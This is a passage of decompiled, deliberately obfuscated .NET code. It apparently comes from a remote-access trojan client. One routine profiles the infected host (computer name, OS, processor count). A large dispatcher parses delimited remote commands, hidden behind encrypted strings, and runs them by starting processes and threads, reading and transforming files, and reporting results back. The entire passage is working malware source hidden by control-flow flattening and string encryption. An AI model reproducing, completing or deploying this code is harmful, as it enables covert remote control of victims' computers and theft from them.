				ProjectData.ClearProjectError();
			}
			string text2 = _003CModule_003E._____<string>(3077268962u);
			try
			{
				text2 = ((!Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains(_003CModule_003E.____<string>(836847038u))) ? _003CModule_003E.___<string>(3747581205u) : _003CModule_003E.___<string>(158340191u));
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				text2 = _003CModule_003E._____<string>(3077268962u);
				ProjectData.ClearProjectError();
			}
			try
			{
				string name = ((ServerComputer)global::_____________._).get_Name();
				int num = default(int);
				text = ((Operators.CompareString(name, string.Empty, false) == 0) ? (text + _003CModule_003E.___<string>(3686971601u)) : (text + _003CModule_003E.___<string>(2677394803u) + name + _003CModule_003E.__________((int)(((((uint)num % 32768u) & 0x6C188000) == 0) ? 45417 : ((nint)Type.EmptyTypes.LongLength + 1580339735)), 47121, (int)((nint)Type.EmptyTypes.LongLength + 197))));
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				text += _003CModule_003E.______<string>(322836794u);
				ProjectData.ClearProjectError();
			}
			try
			{
				int num2 = default(int);
				if (~(0x7BD2302C | (num2 * 2 + 2 * num2)) == num2 + num2 * 3 - 5616)
				{
				}
				string oSFullName;
				int num3 = default(int);
				while (true)
				{
					oSFullName = ((ServerComputer)global::_____________._).get_Info().get_OSFullName();
					if (!oSFullName.Contains(_003CModule_003E.___<string>(2981245319u)))
					{
						break;
					}
					if (((43 * num3 + num3 * 21 + 4904) | -34) == -2)
					{
						text = text + _003CModule_003E.____<string>(774338714u) + text2;
						break;
					}
				}
				nint num4;
				if (oSFullName.Contains(_003CModule_003E.______<string>(628773579u)))
				{
					num4 = (nint)Type.EmptyTypes.LongLength + 1;
					goto IL_022e;
				}
				goto IL_0280;
				IL_022e:
				switch (num4)
				{
				case 0:
					break;
				default:
					goto IL_023f;
				case 2:
					goto IL_0298;
				}
				text = text + _003CModule_003E.___<string>(662727342u) + text2;
				goto IL_01d5;
				IL_02aa:
				if (oSFullName.Contains(_003CModule_003E.______<string>(1197231787u)))
				{
					text = text + _003CModule_003E.______<string>(3851979822u) + text2;
				}
				if (!text.Contains(_003CModule_003E._____<string>(1128206602u)))
				{
					text = text + _003CModule_003E.____<string>(3407540459u) + text2;
				}
				goto end_IL_0142;
				IL_023f:
				text = text + _003CModule_003E._______<string>(484667940u) + text2;
				goto IL_0280;
				IL_0298:
				text = text + _003CModule_003E._____<string>(321630822u) + text2;
				goto IL_02aa;
				IL_01d5:
				if (oSFullName.Contains(_003CModule_003E._____<string>(3789711746u)))
				{
					text = text + _003CModule_003E.___<string>(985285681u) + text2;
				}
				if (oSFullName.Contains(_003CModule_003E._______<string>(758530680u)))
				{
					num4 = (nint)Type.EmptyTypes.LongLength + 2;
					goto IL_022e;
				}
				goto IL_02aa;
				IL_0280:
				if (!oSFullName.Contains(_003CModule_003E._______<string>(539440488u)))
				{
					goto IL_01d5;
				}
				int num5 = default(int);
				if (((num5 + 3 * num5 + 3 * num5 + num5) & 0x53675B00) != ((num5 * 8) & 0x53675B00))
				{
					goto IL_023f;
				}
				num4 = (nint)Type.EmptyTypes.LongLength + 0;
				goto IL_022e;
				end_IL_0142:;
			}
			catch (Exception projectError4)
			{
				ProjectData.SetProjectError(projectError4);
				text = text + _003CModule_003E.____<string>(3407540459u) + text2;
				ProjectData.ClearProjectError();
			}
			try
			{
				text = ((!___________________________________________________________________.________()) ? (text + _003CModule_003E.____<string>(4173955436u)) : (text + _003CModule_003E._____<string>(1240795199u)));
			}
			catch (Exception projectError5)
			{
				ProjectData.SetProjectError(projectError5);
				string text3 = text;
				_003CModule_003E._________________ = -1592258590;
				text = text3 + _003CModule_003E._______<string>(1380398983u);
				ProjectData.ClearProjectError();
			}
			try
			{
				int num = Environment.ProcessorCount;
				string text4 = text;
				int int_ = ((((uint)(4 * num + num * 124 - 7669) >> 7) - 113925046 != (uint)num) ? 12716 : 2038237625);
				nint num6;
				if (((2 * num - 3054) & 2) != (2 & ((num - 7471) * 2)))
				{
					num6 = sizeof(long) + -1853901873;
				}
				else
				{
					int num7 = _003CModule_003E._________________;
					if (((-1191182336 * num7 - 9217) & 0x86B) != 2155)
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 1929082349;
					}
					else if (761 + ((uint)(num7 << 28) >> 28) != (uint)(-num7))
					{
						int num5 = _003CModule_003E._______________;
						num6 = ((1118 * num5 + 930 * num5 - -8445 != -6032) ? 14261 : 829267672);
					}
					else
					{
						num6 = (nint)Type.EmptyTypes.LongLength + 1405938981;
					}
				}
				text = text4 + _003CModule_003E.__________(int_, (int)num6, (int)((((num * 2 + num * 2) | -2) != -2) ? ((nint)Type.EmptyTypes.LongLength + 883152264) : 18)) + num + _003CModule_003E.____<string>(3008796200u);
			}
			catch (Exception projectError6)
			{
				ProjectData.SetProjectError(projectError6);
				text += _003CModule_003E._______<string>(816641505u);
				ProjectData.ClearProjectError();
			}
			try
			{
				text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + _003CModule_003E.__________(3970, (int)((nint)Type.EmptyTypes.LongLength + 5548), (int)((nint)Type.EmptyTypes.LongLength + 178))), ___________________________________________________________________._________()), (object)_003CModule_003E.____<string>(3008796200u)));
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				text += _003CModule_003E._____<string>(3210168151u);
				ProjectData.ClearProjectError();
			}
			result = text;
			return result;
		}
		catch (Exception projectError8)
		{
			ProjectData.SetProjectError(projectError8);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static void ____________________()
	{
		try
		{
			Process.Start(_____________________________________________________________________________.__);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void _____________________(string string_0)
	{
		try
		{
			if (string_0 == null)
			{
				return;
			}
			nint num;
			string[] array = default(string[]);
			if (string_0.Contains(_003CModule_003E.____<string>(2337602916u)))
			{
				num = (nint)Type.EmptyTypes.LongLength + 64;
			}
			else
			{
				array = Strings.Split(string_0, _003CModule_003E._____<string>(1052623516u), -1, (CompareMethod)0);
				num = (nint)Type.EmptyTypes.LongLength + 44;
			}
			____________________________________________________________________ ___________________________________________________________________2 = default(____________________________________________________________________);
			Thread thread8 = default(Thread);
			string text2 = default(string);
			int num23 = default(int);
			int num18 = default(int);
			int num11 = default(int);
			int num3 = default(int);
			int num5 = default(int);
			int num8 = default(int);
			int num19 = default(int);
			byte[] bytes = default(byte[]);
			int num15 = default(int);
			int num9 = default(int);
			int num10 = default(int);
			int num39 = default(int);
			Thread thread4 = default(Thread);
			int num12 = default(int);
			int num6 = default(int);
			Thread thread7 = default(Thread);
			int num35 = default(int);
			Thread thread = default(Thread);
			string text = default(string);
			int num33 = default(int);
			int num13 = default(int);
			int num32 = default(int);
			int num7 = default(int);
			Thread thread9 = default(Thread);
			int num14 = default(int);
			int num29 = default(int);
			int num30 = default(int);
			Thread thread6 = default(Thread);
			int num4 = default(int);
			____________________________________ ___________________________________ = default(____________________________________);
			int num34 = default(int);
			int num36 = default(int);
			string text3 = default(string);
			string[] array2 = default(string[]);
			int num26 = default(int);
			int num48 = default(int);
			int num2 = default(int);
			while (true)
			{
				string text6;
				Random random2;
				byte[] bytes2;
				switch (num)
				{
				case 71:
					___________________________________________________________________2.____ = Convert.ToInt32(array[4]);
					thread8 = new Thread(___________________________________________________________________2._);
					if (num2 != -27051)
					{
						goto case 2;
					}
					goto IL_2314;
				case 2:
					___________________________________________________________________2.__ = array[2];
					___________________________________________________________________2.___ = Convert.ToInt32(array[3]);
					num2 = (int)((nint)Type.EmptyTypes.LongLength + -27051);
					num = sizeof(double) + 63;
					continue;
				case 69:
					num2 = 8186;
					if ((0x7FFF | ((uint)num34 % 4u / 195525u)) != 32767)
					{
						goto case 19;
					}
					if (Operators.CompareString(text2, _003CModule_003E.____<string>(3165706303u), false) == 0)
					{
						num34 = num2;
						num2 = -30314;
						if (num34 != -27363)
						{
							global::__________________._(array[1], array[2], array[3], array[4], array[5], array[6]);
							if ((0x801A59 ^ (((num23 & 0x2062) - -1080419749) & num23)) == 0 || num2 != -30314)
							{
								goto case 41;
							}
							return;
						}
					}
					else
					{
						if (Operators.CompareString(text2, _003CModule_003E._______<string>(1022378589u), false) == 0)
						{
							int num40 = _003CModule_003E.________________;
							if ((0xFFFFDA07u & (uint)((-1216984678 & num18) - 3177)) != 0)
							{
								num = sizeof(float) + 54;
								continue;
							}
							int num41 = (num40 + num40) * 536870912;
							int num42 = _003CModule_003E.________________;
							if ((0x20000000 & ((uint)num41 ^ ((uint)num42 / 123436025u))) == 0)
							{
								num = sizeof(int) + 1904814692;
								continue;
							}
							int num43 = _003CModule_003E.____________;
							if (((11 * num43 + num43 * 5) | -12) == -12 || ((0xD75 ^ -(0x3FE128 & num11)) == 0 && (1 & (num11 + num11 - 2815)) != 1))
							{
								goto default;
							}
							num3 = _003CModule_003E.___________;
							num = (((((num3 << 23) + 843) | -8383677) == -8383669) ? ((nint)Type.EmptyTypes.LongLength + 2079635632) : (sizeof(float) + -2125959417));
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E.____<string>(1025831217u), false) == 0)
						{
							num2 = -16825;
							if (~(num11 + 3 * num11 + 2766) == (int)((uint)(118720 * num11 - 5794) >> 1))
							{
								return;
							}
							byte[] byte_ = File.ReadAllBytes(array[1]);
							nint num44 = (nint)Type.EmptyTypes.LongLength + 761;
							nint num45;
							if (-(num5 * 180912128) == 6299)
							{
								if (8481 + num8 == -num8)
								{
									num45 = (((0x4010C9 ^ ((uint)num5 % 169057u)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -96998318) : (sizeof(int) + -1568167655));
								}
								else
								{
									num19 = _003CModule_003E.__________;
									num45 = ((-782237696 + (num19 ^ 0x4D4) * 512 != num19 * -4193792) ? ((nint)Type.EmptyTypes.LongLength + -1320858906) : (-1177888468));
								}
							}
							else
							{
								num45 = 1183;
							}
							bytes = ___________________________________________________________________._______(byte_, _003CModule_003E.__________((int)num44, (int)num45, (int)((nint)Type.EmptyTypes.LongLength + 11)));
							num = (((uint)(~(-427 | num15)) / 134217728u != 2236098668u) ? ((nint)Type.EmptyTypes.LongLength + 23) : ((nint)Type.EmptyTypes.LongLength + 1787865228));
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E._____<string>(1189138378u), false) == 0)
						{
							num2 = (int)(((0xFFFFDF1Bu ^ (uint)(num9 + num9 * 15)) != 0) ? ((nint)Type.EmptyTypes.LongLength + -11849) : (((num10 << 16) - 1043333120 != num10 * 65536 + 3945) ? ((nint)Type.EmptyTypes.LongLength + -1184964527) : (sizeof(Guid) + -1291609624)));
							num = sizeof(int) + 52;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E._______<string>(3361566155u), false) == 0)
						{
							num2 = -21839;
							if (((((uint)(num39 * 3 + num39 - 4164) ^ 0x2097u) != 0) ? ((nint)Type.EmptyTypes.LongLength + 20770) : ((nint)Type.EmptyTypes.LongLength + 2019159496)) == 20770)
							{
								Thread thread11 = new Thread(_________________________________________________.______);
								thread11.Start();
								return;
							}
							goto case 33;
						}
						if (Operators.CompareString(text2, _003CModule_003E._____<string>(3739909916u), false) == 0)
						{
							num = sizeof(ushort) + -1;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E.______<string>(2353858953u), false) == 0)
						{
							num = (nint)Type.EmptyTypes.LongLength + 50;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E.______<string>(3688141429u), false) == 0)
						{
							num2 = 28517;
							if ((0x10A3 ^ ((uint)num14 / 134217728u)) == 0)
							{
								break;
							}
							goto IL_214e;
						}
						if (Operators.CompareString(text2, _003CModule_003E._______<string>(4052219501u), false) != 0)
						{
							_003CModule_003E.___ = num5;
							if (Operators.CompareString(text2, _003CModule_003E._____<string>(251518400u), false) != 0)
							{
								if (Operators.CompareString(text2, _003CModule_003E._____<string>(1095005382u), false) != 0)
								{
									goto IL_050e;
								}
								num2 = (int)((nint)Type.EmptyTypes.LongLength + -29183);
								goto case 49;
							}
							num2 = 16275;
							if (sizeof(ushort) + -9418 == -9416)
							{
								_______________________________._(array[1]);
							}
							return;
						}
					}
					goto case 5;
				case 19:
				{
					________________________________ _______________________________2 = new ________________________________();
					thread4 = new Thread(_______________________________2.______);
					if ((0x10000979 ^ ((uint)(num12 & 0x21CE) % 123508870u)) == 0)
					{
						num39 = _003CModule_003E._____________;
						if ((0x3A000000 & ((uint)num39 / 632u)) == (((uint)num39 / 214225u >> 2) & 0x3A000000))
						{
							goto default;
						}
						num = sizeof(int) + -787138310;
						continue;
					}
					num = (nint)Type.EmptyTypes.LongLength + 45;
					continue;
				}
				case 5:
					__________________________________________________________________._____(_003CModule_003E.___<string>(1766172096u), array[1]);
					______________________________________________________________._______________ = array[1];
					num = sizeof(long) + 4;
					continue;
				default:
				{
					string_0 = string_0.Replace(_003CModule_003E._______<string>(4106332662u), string.Empty);
					string text4 = string_0;
					num6 = _003CModule_003E._________________;
					if (Operators.CompareString(text4, _003CModule_003E.__________(sizeof(short) + 36928, (int)(((uint)(num8 << 8) / 44135206u == 2927616331u) ? ((nint)Type.EmptyTypes.LongLength + -695418064) : 39081), (int)((nint)Type.EmptyTypes.LongLength + 27)), false) == 0)
					{
						num = ((num2 * -1799094272 != 4896) ? (sizeof(float) + 42) : (sizeof(short) + -2088112801));
						continue;
					}
					________________________________________________ _______________________________________________2 = new ________________________________________________();
					_______________________________________________2._ = string_0;
					thread7 = new Thread(_______________________________________________2._);
					break;
				}
				case 51:
					num2 = 1082;
					if (Operators.CompareString(text2, _003CModule_003E._____<string>(1940347355u), false) == 0)
					{
						if (num2 == 1082)
						{
							goto IL_082f;
						}
						goto IL_21fa;
					}
					if (Operators.CompareString(text2, _003CModule_003E.______<string>(3506556897u), false) == 0)
					{
						goto case 30;
					}
					if (Operators.CompareString(text2, _003CModule_003E._____<string>(3328321721u), false) == 0)
					{
						num2 = -18374;
						if (~((uint)(num12 * 335544320) >> 19) == (uint)(num10 << 5))
						{
							return;
						}
						if (Operators.CompareString(______________________________________________________________._________________, _003CModule_003E._______<string>(1177340789u), false) != 0)
						{
							num34 = num2;
							num2 = -5259;
							if (num34 != -18374)
							{
								goto IL_2314;
							}
							__________________________________________________________________._____(_003CModule_003E.____<string>(728687342u), _003CModule_003E._______<string>(1673631998u));
							______________(_003CModule_003E._______<string>(1670293721u), _003CModule_003E.____<string>(176132015u));
							if (2224 + (uint)num14 % 3027795u == 1739871977 || num2 != -1144)
							{
								return;
							}
							goto IL_094c;
						}
						______________(_003CModule_003E.______<string>(2655866516u), _003CModule_003E._____<string>(327195795u));
						return;
					}
					num2 = -10530;
					if (4194304 * ((uint)num35 / 65536u) == 2231139920u)
					{
						goto case 13;
					}
					if (Operators.CompareString(text2, _003CModule_003E.______<string>(1187344092u), false) == 0)
					{
						if (num2 == -2056)
						{
							goto case 56;
						}
						goto IL_2230;
					}
					return;
				case 30:
					global::____________________.______(array[1], array[2]);
					num = (nint)Type.EmptyTypes.LongLength + 20;
					continue;
				case 56:
				{
					Thread thread3 = new Thread(global::____________________._);
					thread3.Start();
					if (num2 != -23421)
					{
						return;
					}
					goto IL_09dd;
				}
				case 68:
				{
					bool bool_ = true;
					bool bool_2 = true;
					if (Operators.CompareString(array[2], _003CModule_003E.______<string>(2943992522u), false) == 0)
					{
						if (num2 == 30110)
						{
							goto IL_214e;
						}
						bool_ = false;
					}
					if (Operators.CompareString(array[3], _003CModule_003E._____<string>(2303988711u), false) == 0)
					{
						num2 = -25861;
						if (sizeof(int) + -30042 == -32154)
						{
							return;
						}
						bool_2 = false;
					}
					global::______________________.__________(array[1], bool_, bool_2);
					int num37 = _003CModule_003E._______________;
					num = ((((num37 * 5 + num37 * 3) ^ 0x2354) + 9850 == (int)((uint)(num37 * 67108864) >> 16)) ? (sizeof(short) + 2065535173) : ((nint)Type.EmptyTypes.LongLength + 15));
					continue;
				}
				case 67:
					global::______________________._________(array[1], array[2]);
					num = (nint)Type.EmptyTypes.LongLength + 48;
					continue;
				case 61:
					_________________________________________________________________._ = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 55649), (int)((nint)Type.EmptyTypes.LongLength + 57253), (int)((((num5 * 52 + num5 * 12) | -17 | (num5 << 12)) == -17) ? 27 : ((nint)Type.EmptyTypes.LongLength + 1914786943)));
					num2 = -31167;
					if (4238 + ((num4 << 3) - 5591) != 2 * (2896 + num4 + 3 * num4))
					{
						______________________________________________________________________ _____________________________________________________________________2 = new ______________________________________________________________________();
						_____________________________________________________________________2._____ = array[1];
						if (num2 != -11932)
						{
							________________________________________________________________ _______________________________________________________________ = new ________________________________________________________________();
							_______________________________________________________________._ = _____________________________________________________________________2;
							thread = new Thread(_______________________________________________________________._);
							num = 66;
							continue;
						}
						goto case 27;
					}
					return;
				case 58:
					global::____________________._______(array[2], array[1]);
					num = (nint)Type.EmptyTypes.LongLength + 11;
					continue;
				case 53:
					if (Operators.CompareString(array[2], _003CModule_003E._______<string>(2794470400u), false) == 0)
					{
						goto case 42;
					}
					______________(_003CModule_003E.____<string>(3395602991u), _003CModule_003E.___<string>(3821465187u) + text);
					num2 = 15567;
					if ((nint)Type.EmptyTypes.LongLength + 16305 != -11071)
					{
						return;
					}
					goto IL_1ef2;
				case 42:
					Process.Start(text);
					______________(_003CModule_003E._____<string>(1464211711u), _003CModule_003E._______<string>(619600478u) + text);
					if ((((uint)num11 / 63952569u) | 0xC7F) == 3199)
					{
						int num46 = global::______________________._______;
						num = ((num46 * 116015104 == 1225106395) ? ((nint)Type.EmptyTypes.LongLength + -208404402) : (sizeof(ushort) + 6));
						continue;
					}
					if (772407296 * num12 * -260096 != 9860)
					{
						num = sizeof(int) + 1835215106;
						continue;
					}
					if (((num29 * 34 + 30 * num29) | -59) != -59)
					{
						goto default;
					}
					num = sizeof(long) + -1627545973;
					continue;
				case 52:
				{
					if (!_______________________________________________._)
					{
						______________________(array[1]);
					}
					if (!_______________________________________________._)
					{
						return;
					}
					nint num38;
					if ((0x270Fu ^ (uint)(num33 + num33 + -5306)) != 0)
					{
						num38 = (nint)Type.EmptyTypes.LongLength + -6190;
					}
					else
					{
						num13 = global::___________._;
						if (-3823616 + ~(580 * num13 + num13 * 444) != (num13 - 1146) * 1024)
						{
							num32 = -748921169;
							num38 = num32;
						}
						else
						{
							num38 = 2064712751;
						}
					}
					num2 = (int)num38;
					num = (nint)Type.EmptyTypes.LongLength + 16;
					continue;
				}
				case 44:
					text2 = array[0];
					if (Operators.CompareString(text2, _003CModule_003E.______<string>(3476958452u), false) == 0)
					{
						num = (nint)Type.EmptyTypes.LongLength + 54;
						continue;
					}
					if (Operators.CompareString(text2, _003CModule_003E._______<string>(1200049341u), false) == 0)
					{
						num = sizeof(float) + 13;
						continue;
					}
					if (Operators.CompareString(text2, _003CModule_003E.___<string>(3909899698u), false) == 0)
					{
						num2 = 26400;
						if (((((uint)(num6 << 22) >> 22) + 4233 == (uint)(-num6)) ? ((nint)Type.EmptyTypes.LongLength + -1112648496) : ((228360192 + (num7 << 18) != -4866 + (num7 << 21) << 6) ? ((nint)Type.EmptyTypes.LongLength + 20633) : (sizeof(float) + -1961692646))) != 20633)
						{
							goto IL_082f;
						}
						goto IL_1fc2;
					}
					if (Operators.CompareString(text2, _003CModule_003E._____<string>(2534636569u), false) == 0)
					{
						num = 43;
						continue;
					}
					goto case 0;
				case 0:
					num2 = 11315;
					if (Operators.CompareString(text2, _003CModule_003E._______<string>(1419139533u), false) == 0)
					{
						if (num2 != 11315)
						{
							goto IL_050e;
						}
						_____________________________ ____________________________ = new _____________________________();
						thread9 = new Thread(____________________________.________);
						if ((num8 & 0x70000000) == (num8 & 0x70000000))
						{
							goto case 4;
						}
					}
					else
					{
						if (Operators.CompareString(text2, _003CModule_003E.___<string>(2377227926u), false) == 0)
						{
							num = (nint)Type.EmptyTypes.LongLength + 52;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E._____<string>(2065826580u), false) == 0)
						{
							num = (nint)Type.EmptyTypes.LongLength + 19;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E.______<string>(4195373496u), false) == 0)
						{
							num9 = global::______________________._______;
							num = (((0x1001E0A ^ ((uint)(num9 - 4082) / 134217728u)) == 0) ? (sizeof(short) + 1708471192) : ((nint)Type.EmptyTypes.LongLength + 67));
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E._____<string>(903029408u), false) == 0)
						{
							num10 = _003CModule_003E._______________;
							num = (((uint)num10 % 117u == 4294960733u) ? (((3 & (0x14BD ^ ~((num2 & 0x6FB545D8) - 1875))) != 3) ? ((nint)Type.EmptyTypes.LongLength + 491078669) : 1903362894) : (sizeof(float) + 10));
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E._____<string>(1165117804u), false) == 0)
						{
							goto case 65;
						}
						if (Operators.CompareString(text2, _003CModule_003E._____<string>(2320632u), false) == 0)
						{
							goto case 21;
						}
						if (Operators.CompareString(text2, _003CModule_003E._______<string>(2588733316u), false) == 0)
						{
							num = (nint)Type.EmptyTypes.LongLength + 61;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E._______<string>(2643505864u), false) == 0)
						{
							num = (nint)Type.EmptyTypes.LongLength + 41;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E._______<string>(2917368604u), false) == 0)
						{
							num2 = (int)((nint)Type.EmptyTypes.LongLength + -23394);
							num = (nint)Type.EmptyTypes.LongLength + 59;
							continue;
						}
						if (Operators.CompareString(text2, _003CModule_003E.______<string>(2115042142u), false) == 0)
						{
							num2 = 4578;
							___________(_003CModule_003E.____<string>(1816301751u) + _____________________________________________________________________.___(array[1]));
							return;
						}
						if (Operators.CompareString(text2, _003CModule_003E._____<string>(340086423u), false) == 0)
						{
							num = sizeof(float) + 6;
							continue;
						}
						string text5 = text2;
						_003CModule_003E._________ = null;
						if (Operators.CompareString(text5, _003CModule_003E._____<string>(1877560588u), false) == 0)
						{
							num2 = -651;
							if ((nint)Type.EmptyTypes.LongLength + -23987 != -23987)
							{
								return;
							}
							goto IL_1c9c;
						}
						if (Operators.CompareString(text2, _003CModule_003E.___<string>(2478936815u), false) == 0)
						{
							num2 = 21544;
							if ((nint)Type.EmptyTypes.LongLength + -16783 != -16783)
							{
								goto case 68;
							}
							goto IL_17db;
						}
						if (Operators.CompareString(text2, _003CModule_003E.____<string>(3149669265u), false) == 0)
						{
							goto case 18;
						}
						if (Operators.CompareString(text2, _003CModule_003E._______<string>(3081686248u), false) == 0)
						{
							goto case 34;
						}
						if (Operators.CompareString(text2, _003CModule_003E.______<string>(2073591391u), false) == 0)
						{
							num11 = _003CModule_003E.________________;
							if ((0x10B9Du ^ (uint)(-(4194304 * num11))) != 0)
							{
								num = (nint)Type.EmptyTypes.LongLength + 25;
								continue;
							}
							if ((0x40Du ^ (uint)(num9 * 1972189654)) != 0)
							{
								num = (nint)Type.EmptyTypes.LongLength + 1577822613;
								continue;
							}
						}
						else
						{
							if (Operators.CompareString(text2, _003CModule_003E.____<string>(1616839311u), false) == 0)
							{
								num = ((((num12 * 384 + 640 * num12) | -423) != -423) ? (sizeof(uint) + -2007896705) : ((nint)Type.EmptyTypes.LongLength + 7));
								continue;
							}
							if (Operators.CompareString(text2, _003CModule_003E.____<string>(1009794179u), false) == 0)
							{
								num2 = -24827;
								if (sizeof(int) + 8516 == 8520)
								{
									global::___________________.__();
									return;
								}
								goto case 7;
							}
							if (Operators.CompareString(text2, _003CModule_003E._______<string>(3300776440u), false) == 0)
							{
								num = (((-12 | (5 * num6 + 11 * num6)) == -12) ? ((nint)Type.EmptyTypes.LongLength + 32) : ((nint)Type.EmptyTypes.LongLength + 716935112));
								continue;
							}
							if (Operators.CompareString(text2, _003CModule_003E.______<string>(129399956u), false) == 0)
							{
								num = sizeof(double) + 30;
								continue;
							}
							if (Operators.CompareString(text2, _003CModule_003E._____<string>(233062799u), false) == 0)
							{
								num2 = 4700;
								________________________(array[1], array[2], array[3]);
								num = ((~(num13 * 1672 + num13 * 376) != (int)((uint)(-324796416 * (int)((uint)num13 / 3375123u)) >> 9)) ? ((nint)Type.EmptyTypes.LongLength + 39) : ((nint)Type.EmptyTypes.LongLength + -2104324626));
								continue;
							}
							if (Operators.CompareString(text2, _003CModule_003E.___<string>(331854415u), false) == 0)
							{
								num14 = 63;
								goto case 63;
							}
							if (Operators.CompareString(text2, _003CModule_003E.___<string>(271244811u), false) == 0)
							{
								num2 = 26199;
								if (sizeof(ushort) + -19447 != 22490)
								{
									goto IL_1fee;
								}
								return;
							}
							if (Operators.CompareString(text2, _003CModule_003E.___<string>(1360139036u), false) != 0)
							{
								if (Operators.CompareString(text2, _003CModule_003E._______<string>(1425156700u), false) == 0)
								{
									num2 = -1227;
									if (~(num4 + 3 * num4 + 2766) == (int)((uint)(118720 * num4 - 5794) >> 1))
									{
										goto case 53;
									}
									goto IL_21fa;
								}
								if (Operators.CompareString(text2, _003CModule_003E.______<string>(2422943538u), false) == 0)
								{
									num15 = 9;
									goto case 9;
								}
								if (Operators.CompareString(text2, _003CModule_003E.____<string>(3294641900u), false) != 0)
								{
									if (Operators.CompareString(text2, _003CModule_003E.______<string>(782724277u), false) == 0)
									{
										num = sizeof(ulong) + 18;
										continue;
									}
									if (Operators.CompareString(text2, _003CModule_003E._______<string>(3490481526u), false) == 0)
									{
										num2 = -4496;
										if (sizeof(int) + 18018 == 18022)
										{
											if (array[1].Contains(global::______________________._____))
											{
												global::____________________.___________(array[1]);
												if (num2 == -4496 && ((uint)((0xD5F & num12) - -8064) ^ 0x1001B9Fu) != 0)
												{
												}
											}
											return;
										}
										goto IL_1c9c;
									}
									if (Operators.CompareString(text2, _003CModule_003E._______<string>(529425657u), false) == 0)
									{
										num2 = 26481;
										if ((nint)Type.EmptyTypes.LongLength + 2321 == 381)
										{
											goto IL_1fee;
										}
										text6 = __________________________________________________________________.____(_003CModule_003E.____<string>(586994363u));
										string text7 = text6;
										int num16;
										nint num17;
										if ((0xFFFE6AC & (6609 + -805306368 * num6)) == 128)
										{
											num16 = 24168;
											num17 = num16;
										}
										else if (((((uint)num8 / 524288u) | 0xD38) & 0xFFFFE100u) == 256)
										{
											num16 = -788155254;
											num17 = num16;
										}
										else
										{
											num17 = (nint)Type.EmptyTypes.LongLength + -2143249288;
										}
										if (Operators.CompareString(text7, _003CModule_003E.__________((int)num17, (int)((-55544 + (4715 + num5) * 8 == ~(num5 + 7 * num5)) ? ((nint)Type.EmptyTypes.LongLength + -2052386147) : (sizeof(double) + 26621)), (int)((nint)Type.EmptyTypes.LongLength + 210)), false) == 0)
										{
											if (~(-num18) == num18 - -1010)
											{
												goto default;
											}
											goto case 70;
										}
										goto IL_22e8;
									}
									if (Operators.CompareString(text2, _003CModule_003E.______<string>(101766122u), false) == 0)
									{
										num2 = -28412;
										nint num20;
										if (536870912 + (uint)num19 % 65536u + 1154 == (uint)(-(num19 + num19) << 29))
										{
											num20 = (nint)Type.EmptyTypes.LongLength + -754521959;
										}
										else
										{
											int num21 = global::______________________._______;
											int num22 = (num21 | -4075) - 14642;
											num23 = _003CModule_003E.___________;
											num20 = ((num22 != ((3 * num23 + num23) ^ 0xF15) * num21) ? (sizeof(ulong) + 25005) : (sizeof(ushort) + 1237813406));
										}
										if (num20 != 25013)
										{
											goto IL_050e;
										}
										___________(_003CModule_003E._____<string>(2333479949u) + _________________________________________________________________.______________() + _003CModule_003E.____<string>(3008796200u));
										return;
									}
									if (Operators.CompareString(text2, _003CModule_003E._____<string>(1752081363u), false) != 0)
									{
										if (Operators.CompareString(text2, _003CModule_003E._____<string>(1447611101u), false) == 0)
										{
											num = ((~((uint)num13 / 4139932u) == (uint)(num18 * 1073741824 << 14)) ? ((nint)Type.EmptyTypes.LongLength + -1036534280) : ((nint)Type.EmptyTypes.LongLength + 27));
											continue;
										}
										if (Operators.CompareString(text2, _003CModule_003E.______<string>(3382204644u), false) == 0)
										{
											num = (nint)Type.EmptyTypes.LongLength + 40;
											continue;
										}
										if (Operators.CompareString(text2, _003CModule_003E.___<string>(1481358244u), false) != 0)
										{
											if (Operators.CompareString(text2, _003CModule_003E.______<string>(1408414764u), false) != 0)
											{
												if (Operators.CompareString(text2, _003CModule_003E.____<string>(1696204587u), false) == 0)
												{
													num2 = 27459;
													num = (nint)Type.EmptyTypes.LongLength + 28;
													continue;
												}
												if (Operators.CompareString(text2, _003CModule_003E._____<string>(2497819676u), false) == 0)
												{
													num2 = 18428;
													if (sizeof(ushort) + 17455 == 17457)
													{
														__________________(array[1], array[2], bool_0: true);
														num = (nint)Type.EmptyTypes.LongLength + 6;
														continue;
													}
													goto IL_17db;
												}
												if (Operators.CompareString(text2, _003CModule_003E._____<string>(1977258557u), false) == 0)
												{
													num = 22;
													continue;
												}
												if (Operators.CompareString(text2, _003CModule_003E._____<string>(382562598u), false) != 0)
												{
													goto case 69;
												}
												num2 = -4432;
												int num24 = global::______________________._______;
												nint num25;
												if ((((uint)num24 % 4036271u) ^ 0x8005CBu) != 0)
												{
													num25 = 11943;
												}
												else
												{
													num26 = _003CModule_003E.______________;
													if ((((uint)num26 / 67108864u - 8380) & 0x1BD82D00) != 467143936)
													{
														int num27 = _003CModule_003E.___________;
														int num28 = (num27 * 14 + 2 * num27) * 2048 - 75587584;
														num29 = _003CModule_003E.________________;
														num25 = ((num28 == num29 * 909639680) ? ((nint)Type.EmptyTypes.LongLength + 306113298) : ((nint)Type.EmptyTypes.LongLength + 1668462087));
													}
													else
													{
														num25 = (nint)Type.EmptyTypes.LongLength + 2140064777;
													}
												}
												if (num25 != 11943)
												{
